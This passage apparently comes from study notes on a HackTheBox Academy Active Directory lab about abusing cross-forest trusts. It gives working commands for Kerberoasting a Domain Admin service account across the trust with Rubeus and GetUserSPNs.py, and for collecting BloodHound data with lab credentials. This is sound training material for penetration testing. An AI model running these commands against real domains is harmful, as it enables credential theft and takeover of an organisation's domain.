krbtgt
mssqlsvc
```

We see that there is one account with an SPN in the target domain. A quick check shows that this account is a member of the Domain Admins group in the target domain, so if we can Kerberoast it and crack the hash offline, we'd have full admin rights to the target domain.

```powershell
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

Let's perform a Kerberoasting attack across the trust using `Rubeus`. We run the tool as we did in the Kerberoasting section, but we include the `/domain:` flag and specify the target domain.

* `PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`

## **Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux**

Getting the SPNs

* `dollarboysushil@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
* `dollarboysushil@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley` → specifying -request flag gives us the ricket.

## **Hunting Foreign Group Membership with Bloodhound-python**

*   `dollarboysushil@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2` → for inlanefreight.local

    we can then compress the result into zip file

    `zip -r ilfreight_bh.zip *.json`
* `dollarboysushil@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2` → for freightlogistics.local

#### **Viewing Dangerous Rights through BloodHound**

![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 17.png>)
